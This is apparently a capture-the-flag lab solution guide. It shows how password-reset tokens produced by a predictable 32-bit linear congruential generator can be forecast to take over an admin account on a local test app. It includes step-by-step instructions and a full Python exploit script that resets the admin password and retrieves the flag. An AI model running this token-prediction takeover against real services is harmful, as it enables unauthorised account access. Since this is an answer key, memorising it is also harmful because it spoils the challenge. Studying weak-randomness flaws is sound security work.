# A07 Hard: Solution Guide

### Vulnerability Analysis
The application generates 8-character hex tokens using a 32-bit Linear Congruential Generator:
$$X_{n+1} = (A \cdot X_n + C) \pmod M$$
where:
- $A = 1664525$
- $C = 1013904223$
- $M = 2^{32} = 4294967296$

Since the 8-character hex token directly represents the raw 32-bit integer state $X_n$, observing any token $T_1$ allows exact calculation of the subsequent token $T_2$.

### Exploitation Steps
1. Request a password reset for `researcher_demo@apexbiologistics.net` via `POST /forgot-password`.
2. Retrieve the token $T_1$ from `GET /outbox`.
3. Request a password reset for `admin@apexbiologistics.net` via `POST /forgot-password`.
4. Calculate $T_{admin} = (1664525 \cdot \text{int}(T_1, 16) + 1013904223) \pmod{2^{32}}$ and format as 8 hex digits lowercase.
5. Submit `POST /reset-password` with `email=admin@apexbiologistics.net`, `token=T_admin`, `new_password=Pwned2026!`.
6. Authenticate at `POST /login` with `admin@apexbiologistics.net` and `Pwned2026!`.
7. Retrieve the dynamic flag from `GET /admin/governance`.

### Exploit Script
```python
import requests
import re

BASE_URL = "http://127.0.0.1:6021"
s = requests.Session()

# LCG parameters
A = 1664525
C = 1013904223
M = 2**32

# 1. Request token for demo account
s.post(f"{BASE_URL}/forgot-password", data={"email": "researcher_demo@apexbiologistics.net"})

# 2. Get token from outbox
outbox_html = s.get(f"{BASE_URL}/outbox").text
tokens = re.findall(r'<code style="color: var\(--teal\); font-weight: 700;">([0-9a-f]{8})</code>', outbox_html)
t1 = tokens[-1]
state1 = int(t1, 16)

# 3. Request reset for admin
s.post(f"{BASE_URL}/forgot-password", data={"email": "admin@apexbiologistics.net"})

# 4. Predict admin token
admin_state = (A * state1 + C) % M
admin_token = f"{admin_state:08x}"
print(f"[+] Predicted admin token: {admin_token}")

# 5. Reset admin password
new_pwd = "NewAdminPassword2026!"
resp = s.post(f"{BASE_URL}/reset-password", data={
    "email": "admin@apexbiologistics.net",
    "token": admin_token,
    "new_password": new_pwd
})

# 6. Login as admin
s.post(f"{BASE_URL}/login", data={
    "email": "admin@apexbiologistics.net",
    "password": new_pwd
})

# 7. Extract flag
gov_html = s.get(f"{BASE_URL}/admin/governance").text
flag = re.search(r"RTSA\{[^}]+\}", gov_html).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
